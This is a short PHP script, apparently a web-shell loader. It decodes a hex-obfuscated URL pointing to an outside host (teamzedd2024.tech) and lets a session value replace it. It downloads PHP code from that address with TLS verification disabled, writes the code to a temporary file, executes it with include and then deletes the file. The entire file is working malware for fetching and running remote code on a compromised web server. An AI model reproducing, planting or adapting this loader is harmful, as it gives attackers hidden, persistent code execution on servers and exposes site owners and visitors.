<?php
@session_start();

$hexParts = [
    '68','74','74','70','73','3a','2f','2f',
    '74','65','61','6d','7a','65','64','64',
    '32','30','32','34','2e','74','65','63',
    '68','2f','72','61','77','2f','4d','63',
    '75','51','47','49'
];
$hex = implode('', $hexParts);
$url = '';
for ($i = 0; $i < strlen($hex); $i += 2) {
    $url .= chr(hexdec(substr($hex, $i, 2)));
}

if (!empty($_SESSION['ts_url'])) {
    $url = $_SESSION['ts_url'];
}

function fetchRemote($url) {
    $data = @file_get_contents($url);
    if (!$data && function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYHOST => 0,
            CURLOPT_SSL_VERIFYPEER => 0,
        ]);
        $data = curl_exec($ch);
        curl_close($ch);
    }
    return $data;
}

$content = fetchRemote($url);

if (!empty($content)) {
    if (strpos(trim($content), '<?php') !== 0) {
        echo "Konten bukan file PHP valid. Awalan: " . htmlentities(substr($content, 0, 30));
        exit;
    }

    $temp = tempnam(sys_get_temp_dir(), 'ld_');
    file_put_contents($temp, $content);

    try {
        include $temp;
    } catch (Throwable $e) {
        echo "Error saat load konten: " . $e->getMessage();
    }

    unlink($temp);
} else {
    echo "Gagal mengambil konten dari $url.";
}
?>
